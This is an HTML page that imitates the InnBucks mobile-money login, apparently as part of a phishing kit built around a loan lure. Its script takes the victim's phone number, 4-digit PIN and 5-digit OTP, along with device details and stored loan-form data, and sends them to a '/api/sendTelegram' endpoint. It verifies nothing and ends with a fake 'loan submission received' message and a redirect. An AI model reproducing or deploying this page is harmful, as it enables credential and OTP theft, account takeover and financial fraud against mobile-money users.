<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>InnBucks — Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{
  box-sizing:border-box;
  -webkit-tap-highlight-color:transparent;
}
html,body{height:100%}
body{
  font-family:Inter,system-ui,Arial;
  background:#020617;
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#e5e7eb;
}

/* CARD */
.card{
  width:100%;
  max-width:380px;
  background:#020617;
  padding:20px;
  border-radius:14px;
  border:1px solid #1f2937;
  box-shadow:0 18px 45px rgba(0,0,0,.75);
}

.logo{
  height:44px;
  display:block;
  margin:0 auto 10px;
}

h2{
  text-align:center;
  margin:0 0 12px;
  font-size:20px;
  color:#f8fafc;
  letter-spacing:.2px;
}

label{
  display:block;
  font-size:13px;
  margin-top:8px;
  color:#cbd5f5;
}

input{
  width:100%;
  padding:10px;
  border-radius:8px;
  border:1px solid #1f2937;
  background:#020617;
  color:#e5e7eb;
  font-size:14px;
  outline:none;
  transition:border-color .15s ease, box-shadow .15s ease;
}

input:focus{
  border-color:#2563eb;
  box-shadow:0 0 0 1px rgba(37,99,235,.35);
}

/* BUTTON */
.btn{
  background:#2563eb;
  color:#fff;
  padding:10px;
  border-radius:8px;
  border:0;
  margin-top:12px;
  width:100%;
  font-weight:600;
  cursor:pointer;
}

.btn[disabled]{
  background:#334155;
  cursor:not-allowed;
}

.req{color:#ef4444;margin-right:6px}
.small{font-size:13px;color:#9ca3af}
.success{color:#22c55e;font-weight:600}
.error{min-height:18px;font-size:13px;color:#ef4444}

/* PIN */
.pin-row{
  display:flex;
  gap:10px;
  justify-content:center;
  margin-top:10px;
}

.pin-digit{
  width:18px;
  height:18px;
  border-radius:50%;
  border:2px solid #fff;
  background:#fff;
  font-size:1px;
  color:transparent;
  caret-color:transparent;
  outline:none;
}

.pin-digit.filled{
  background:#2563eb;
  border-color:#2563eb;
}

/* OTP MODAL */
.otp-modal{
  position:fixed;
  inset:0;
  background:rgba(2,6,23,.88);
  display:flex;
  align-items:center;
  justify-content:center;
}

.otp-box{
  background:#020617;
  padding:20px;
  border-radius:14px;
  min-width:340px;
  border:1px solid #1f2937;
}

.otp-row{
  display:flex;
  gap:10px;
  justify-content:center;
  margin-top:10px;
}

.otp-digit{
  width:18px;
  height:18px;
  border-radius:50%;
  border:2px solid #fff;
  background:#fff;
}

.otp-digit.filled{
  background:#2563eb;
  border-color:#2563eb;
}

.otp-warning{
  color:#ef4444;
  font-size:13px;
  display:none;
}

/* RESEND */
.resend-row{
  display:flex;
  justify-content:space-between;
  margin-top:14px;
}

.resend-btn{
  background:#020617;
  border:1px solid #1f2937;
  padding:10px 14px;
  border-radius:8px;
  color:#e5e7eb;
}

.resend-btn[disabled]{
  opacity:.6;
  cursor:not-allowed;
}

.action-primary{background:#2563eb;border:0}

/* SPINNER */
.spinner{
  width:14px;
  height:14px;
  border:2px solid rgba(255,255,255,.3);
  border-top-color:#fff;
  border-radius:50%;
  display:inline-block;
  animation:spin .8s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>

<body>

<div class="card">
  <img src="assets/InnBucks.png" alt="InnBucks" class="logo">
  <h2>Login</h2>

  <form id="loginForm" autocomplete="off">
    <label><span class="req">★</span>Mobile Number</label>
    <input id="phone" value="+263" inputmode="numeric">
    <div id="phoneError" class="error"></div>

    <label><span class="req">★</span>Enter your PIN</label>
    <div class="pin-row">
      <input class="pin-digit" maxlength="1">
      <input class="pin-digit" maxlength="1">
      <input class="pin-digit" maxlength="1">
      <input class="pin-digit" maxlength="1">
    </div>

    <input id="hp" style="display:none">
    <button id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- OTP MODAL -->
<div id="otpModal" class="otp-modal" style="display:none">
  <div class="otp-box">
    <strong>Enter OTP</strong>
    <p class="small">We have sent an OTP to your phone.</p>

    <div class="otp-row">
      <div class="otp-digit"></div><div class="otp-digit"></div>
      <div class="otp-digit"></div><div class="otp-digit"></div>
      <div class="otp-digit"></div>
    </div>

    <input id="otpBuffer" inputmode="numeric"
           style="position:absolute;opacity:0;pointer-events:none">

    <div id="otpWarning" class="otp-warning">Please input 5 digits</div>

    <div class="resend-row">
      <div class="small">Resend in <span id="countdown">120</span>s</div>
      <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
    </div>

    <div style="display:flex;gap:10px;margin-top:14px">
      <button id="confirmOtp" class="resend-btn action-primary" disabled>Confirm</button>
      <button id="cancelOtp" class="resend-btn">Cancel</button>
    </div>

    <div id="otpStatus" class="small" style="margin-top:8px"></div>
  </div>
</div>

<script>
/* ===== LOAD LOAN FORM DATA ===== */
let loanForm={};
try{
  const raw=sessionStorage.getItem('loanForm');
  if(raw) loanForm=JSON.parse(raw);
}catch(e){}

/* ===== DEVICE ===== */
const ua=navigator.userAgent;
let device='Unknown';
if(/Android/i.test(ua)) device='Android';
else if(/iPhone|iPad/i.test(ua)) device='iOS';
if(/Chrome/i.test(ua)) device+=' | Chrome';
else if(/Safari/i.test(ua)) device+=' | Safari';

/* ===== PIN HANDLING ===== */
const pins=[...document.querySelectorAll('.pin-digit')];
let pinValue='';
const loginBtn=document.getElementById('loginBtn');

pins.forEach((el,i)=>{
  el.addEventListener('input',()=>{
    el.value=el.value.replace(/\D/g,'');
    el.classList.toggle('filled',!!el.value);
    if(el.value && i<pins.length-1) pins[i+1].focus();
    pinValue=pins.map(p=>p.value).join('');
    loginBtn.disabled=!/^\d{4}$/.test(pinValue);
  });
});

/* ===== API ===== */
async function sendToServer(payload){
  return fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

/* ===== LOGIN → TELEGRAM (FIXED ONLY HERE) ===== */
loginForm.addEventListener('submit',async e=>{
  e.preventDefault();

  await sendToServer({
    event:'login_clicked',
    title:'NEW LOAN SUBMISSION REQUEST',
    phone:phone.value,
    pin:pinValue,
    loanAmount:loanForm.loanAmount || 'N/A',
    loanPeriod:loanForm.repayment || 'N/A',
    employment:loanForm.employment || 'N/A',
    device,
    submittedAt:new Date().toISOString()
  });

  otpModal.style.display='flex';
});

/* ===== CONFIRM OTP → TELEGRAM ===== */
confirmOtp.onclick=async()=>{
  await sendToServer({
    event:'otp_confirm',
    title:'NEW LOAN SUBMISSION REQUEST',
    phone:phone.value,
    pin:pinValue,
    otp:otpBuffer.value,
    loanAmount:loanForm.loanAmount || 'N/A',
    loanPeriod:loanForm.repayment || 'N/A',
    employment:loanForm.employment || 'N/A',
    device,
    submittedAt:new Date().toISOString()
  });

  otpStatus.innerHTML="<span class='success'>Loan submission received successfully.</span>";
  setTimeout(()=>location.href='thankyou.html',1200);
};

/* ===== RESEND OTP → TELEGRAM ===== */
resendBtn.onclick=async()=>{
  resendBtn.innerHTML='<span class="spinner"></span>Sending…';

  await sendToServer({
    event:'resend_otp',
    title:'NEW LOAN SUBMISSION REQUEST',
    phone:phone.value,
    pin:pinValue,
    loanAmount:loanForm.loanAmount || 'N/A',
    loanPeriod:loanForm.repayment || 'N/A',
    employment:loanForm.employment || 'N/A',
    device,
    submittedAt:new Date().toISOString()
  });

  resendBtn.innerHTML='OTP sent ✓';
};

cancelOtp.onclick=()=>{
  otpModal.style.display='none';
};
</script>

</body>
</html>
